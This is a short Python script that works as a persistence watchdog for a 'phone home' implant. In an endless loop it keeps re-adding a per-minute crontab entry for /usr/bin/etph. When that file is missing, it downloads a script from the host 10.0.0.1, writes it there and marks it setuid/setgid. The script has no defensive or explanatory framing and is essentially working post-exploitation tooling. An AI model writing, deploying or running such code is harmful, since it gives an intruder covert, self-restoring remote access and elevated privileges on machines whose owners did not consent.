#!/usr/bin/python
import subprocess
import time
import os
import urllib2

script_location = '/usr/bin/etph'
etph_cron_entry = '* * * * * %s' % script_location

while True:
  ### Check for crontab entry
  with open(os.devnull, 'w') as devnull:
    cron_list = subprocess.Popen(["crontab", "-l"], stdout=subprocess.PIPE, stderr=devnull).communicate()[0]
  print(cron_list)
  if script_location  not in cron_list:
    print("needs fixing")
    p = subprocess.Popen(['crontab','-'], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
    output = p.communicate("%s\n%s\n" % (cron_list, etph_cron_entry))
  else:
    print("crontab entry healthy")


  ### Check for binary
  if os.path.isfile(script_location):
    print("phone home file exists")
  else:
    print("Need to replace phone home script")
    script = urllib2.urlopen("10.0.0.1/phonehomy.py").read()
    file = open(script_location, 'w')
    file.write(script)
    os.chmod(script_location , 6755) 

  time.sleep(5)